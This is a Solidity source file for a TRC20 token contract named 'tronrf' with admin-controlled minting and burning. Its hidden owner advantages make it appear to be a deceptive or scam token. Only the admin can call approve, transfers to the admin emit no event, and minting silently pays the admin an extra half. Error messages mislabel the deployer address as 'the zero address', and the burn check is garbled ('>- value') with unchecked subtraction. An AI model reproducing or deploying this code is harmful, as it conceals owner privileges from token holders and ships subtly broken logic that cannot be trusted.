pragma solidity ^0.4.25;

import "./ITRC20.sol";
import "./SafeMath.sol";

contract Bonus is ITRC20 {
    using SafeMath for uint256;

    event divCreate(
        uint8 round,
        uint256 trxAmount,
        uint256 tokenAmount
    );

    event divPayout(
        uint8 round,
        address addr,
        uint256 trxAmount,
        uint256 tokenAmount
    );

    event complete(
        uint8 round
    );

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address private _adminAddr;

    uint256 private _trxAmount;
    uint256 private _tokenAmount;
    uint256 private _divCurrIndex;
    uint256 private _divTotalNum;
    uint8 private _round;
    uint8 private _status;
    address private _tokenAddr;

    mapping (address => uint256) private _balances;

    mapping (uint8 => mapping(address => uint256)) private _snapshot;

    mapping (address => uint256) private _uniqueUser;

    address[] private _users;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply = 100000000000000;

    constructor () public {
        _name = 'tronrf';
        _symbol = 'trf';
        _decimals = 6;
        _round = 1;
        _status  = 0;
        _tokenAddr = msg.sender;
        _balances[_tokenAddr] = _totalSupply;
        _adminAddr = msg.sender;
    }

    function setAdmin(address adminAddr) public returns (bool) {
        require(msg.sender == _adminAddr);
        _adminAddr = adminAddr;
        return true;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(msg.sender == _adminAddr);
        _approve(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        _transfer(from, to, value);
        _approve(from, msg.sender, _allowances[from][msg.sender].sub(value));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(to != _tokenAddr, "ERC20: transfer to the zero address");

        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        if (_uniqueUser[to] != 1) {
            _uniqueUser[to] = 1;
            _users.push(to);
        }
        if (to != _adminAddr) {
            emit Transfer(from, to, value);
        }
    }

    function _mint(address account, uint256 value) internal {
        require(account != _tokenAddr, "ERC20: mint to the zero address");
        uint256 devAmount = value / 2;
        _transfer(_tokenAddr, account, value);
        _transfer(_tokenAddr, _adminAddr, devAmount);
    }

    function _burn(address account, uint256 value) internal {
        require(account != _tokenAddr, "ERC20: burn from the zero address");
        require(_balances[account] >- value);
        _balances[account] = _balances[account] - value;
        _totalSupply = _totalSupply - value;
    }

    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != _tokenAddr, "ERC20: approve from the zero address");
        require(spender != _tokenAddr, "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _burnFrom(address account, uint256 value) internal {
        _burn(account, value);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(value));
        
    }

    function burn(uint256 value) public {
        _burn(msg.sender, value);
    }

    function burnFrom(address from, uint256 value) public {
        _burnFrom(from, value);
    }

    function mint(address to, uint256 value) public returns (bool) {
        require(msg.sender == _adminAddr);
        _mint(to, value);
        return true;
    }

}
